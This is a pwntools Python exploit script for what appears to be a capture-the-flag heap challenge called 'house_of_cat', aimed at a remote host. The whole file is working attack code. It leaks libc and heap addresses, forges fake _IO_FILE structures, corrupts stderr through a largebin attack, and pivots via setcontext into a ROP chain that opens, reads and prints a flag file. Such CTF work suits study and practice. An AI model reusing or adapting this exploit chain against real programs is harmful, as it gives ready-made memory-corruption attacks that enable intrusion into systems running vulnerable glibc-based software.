from pwn import*
context(os='linux',arch='amd64',log_level='debug')

#s = process('house_of_cat')
#libc = ELF('/home/f101/ctf_tools/glibc-2.34/64/lib/libc.so.6')
s = remote('123.56.87.28',21474)
libc = ELF('./libc.so.6')

def add(index,size,content):
	s.sendlineafter(b'mew mew mew~~~~~~\n', b'CAT | r00t QWBQWXF $\xff\xff\xff\xff\x00')
	s.sendlineafter(b'plz input your cat choice:\n', b'1')
	s.sendlineafter(b'plz input your cat idx:\n', str(index))
	s.sendlineafter(b'plz input your cat size:\n', str(size))
	s.sendafter(b'plz input your content:\n', content)

def delete(index):
	s.sendlineafter(b'mew mew mew~~~~~~\n', b'CAT | r00t QWBQWXF $\xff\xff\xff\xff\x00')
	s.sendlineafter(b'plz input your cat choice:\n', b'2')
	s.sendlineafter(b'plz input your cat idx:\n', str(index))

def show(index):
	s.sendlineafter(b'mew mew mew~~~~~~\n', b'CAT | r00t QWBQWXF $\xff\xff\xff\xff\x00')
	s.sendlineafter(b'plz input your cat choice:\n', b'3')
	s.sendlineafter(b'plz input your cat idx:\n', str(index))

def edit(index, content):
	s.sendlineafter(b'mew mew mew~~~~~~\n', b'CAT | r00t QWBQWXF $\xff\xff\xff\xff\x00')
	s.sendlineafter(b'plz input your cat choice:\n', b'4')
	s.sendlineafter(b'plz input your cat idx:\n', str(index))
	s.sendafter(b'plz input your content:\n', content)
	

payload = b'LOGIN | r00t QWBQWXF admin\x00'
s.sendlineafter(b'mew mew mew~~~~~~\n', payload)

add(0, 0x428, b'a') # 0
add(1, 0x418, b'a') # 1
add(2, 0x418, b'a') # 2
delete(0)
add(3, 0x438, b'a') # 3
show(0)
s.recvuntil(b'Context:\n')
libc_base = u64(s.recv(6).ljust(8,b'\x00')) - 0x219C80 - 1104
s.recv(10)
heap_base = u64(s.recv(6).ljust(8,b'\x00')) - 0x290
success('libc_base=>' + hex(libc_base))
success('heap_base=>' + hex(heap_base))

_IO_wfile_jumps_mmap  = libc_base + 0x216000
setcontext_61 = libc_base + 0x53A30 + 61
magic_gadget = libc_base + 0x000000000007498c
# mov rdx, r13; mov rsi, r12; mov rdi, r14; call qword ptr [rbx + 0x38];
magic_gadget1 = libc_base + 0x00000000001675b0
# mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
ret = libc_base + 0x00000000000f872e
pop_rdi_ret = libc_base + 0x000000000002a3e5
pop_rsi_ret = libc_base + 0x000000000002be51
pop_rdx_r12_ret = libc_base + 0x000000000011f497
pop_rax_ret = libc_base + 0x0000000000045eb0
syscall_ret = libc_base + 0x0000000000091396

rop_addr = heap_base + 0x1780 + 0x10

fake_IO_FILE= p64(libc_base + libc.sym['_IO_2_1_stderr_'] + 131)*5
fake_IO_FILE+= p64(setcontext_61)
fake_IO_FILE+= p64(libc_base + libc.sym['_IO_2_1_stderr_'] + 132) + p64(0)*4
fake_IO_FILE+= p64(rop_addr) # _chain
fake_IO_FILE+= p64(2) + p64(0xffffffffffffffff)
fake_IO_FILE+= p64(0) + p64(libc_base + 0x21ba60)
fake_IO_FILE+= p64(0xffffffffffffffff) + p64(0)
fake_IO_FILE+= p64(heap_base + 0x340) + p64(magic_gadget1)
fake_IO_FILE+= p64(0)*2
fake_IO_FILE+= p64(1) # _mode
fake_IO_FILE+= p64(0)*2
fake_IO_FILE+= p64(_IO_wfile_jumps_mmap-0x20) # vtable
fake_IO_FILE+= p64(0)
fake_IO_FILE+= p64(setcontext_61)
fake_IO_FILE+= b'\x00'*0x28
fake_IO_FILE+= p64(magic_gadget)
fake_IO_FILE+= b'\x00'*0x70
fake_IO_FILE+= p64(heap_base + 0x340)

add(0xf, 0x428, fake_IO_FILE) # 0xf
add(0xd, 0x428, b'a') # 0xd
add(0xc, 0x438, b'a') # 0xc
add(0xb, 0x418, b'a') # 0xb
delete(0xb)
delete(0xc)
delete(0xd)
delete(0xf)
add(0xe, 0x438, b'a') # 0xe

delete(2)
edit(0, p64(libc_base + 0x219C80 + 1104)*2 + p64(heap_base + 0x290) + p64(libc_base + libc.sym['stderr'] - 0x20))

fake_IO_FILE = p64(0) + p64(rop_addr)
fake_IO_FILE+= p64(1) + p64(0)
fake_IO_FILE+= p64(setcontext_61)
fake_IO_FILE+= p64(0)*13
fake_IO_FILE+= p64(heap_base + 0xae0)
fake_IO_FILE = fake_IO_FILE.ljust(0xa0, b'\x00')
fake_IO_FILE+= p64(heap_base + 0xb00) + p64(ret)

add(4, 0x438, fake_IO_FILE) # 4

rop = b'./flag\x00\x00' + p64(0)
rop+= p64(pop_rdi_ret) + p64(0)
rop+= p64(pop_rsi_ret) + p64(0)
rop+= p64(pop_rdx_r12_ret) + p64(0) + p64(0)
rop+= p64(pop_rax_ret) + p64(3)
rop+= p64(syscall_ret)
rop+= p64(pop_rdi_ret) + p64(heap_base + 0xb00 - 0x10)
rop+= p64(pop_rsi_ret) + p64(0)
rop+= p64(pop_rdx_r12_ret) + p64(0) + p64(0)
rop+= p64(pop_rax_ret) + p64(2)
rop+= p64(syscall_ret)
rop+= p64(pop_rdi_ret) + p64(0)
rop+= p64(pop_rsi_ret) + p64(heap_base + 0x1000)
rop+= p64(pop_rdx_r12_ret) + p64(0x30) + p64(0)
rop+= p64(pop_rax_ret) + p64(0)
rop+= p64(syscall_ret)
rop+= p64(pop_rdi_ret) + p64(1)
rop+= p64(pop_rsi_ret) + p64(heap_base + 0x1000)
rop+= p64(pop_rdx_r12_ret) + p64(0x30) + p64(0)
rop+= p64(pop_rax_ret) + p64(1)
rop+= p64(syscall_ret)

add(5, 0x418, rop) # 5

edit(0xb, p64(0) + p64(0x233))

s.sendlineafter(b'mew mew mew~~~~~~\n', b'CAT | r00t QWBQWXF $\xff\xff\xff\xff\x00')
s.sendlineafter(b'plz input your cat choice:\n', b'1')
s.sendlineafter(b'plz input your cat idx:\n', str(0xa))
s.sendlineafter(b'plz input your cat size:\n', str(0x450))

s.interactive()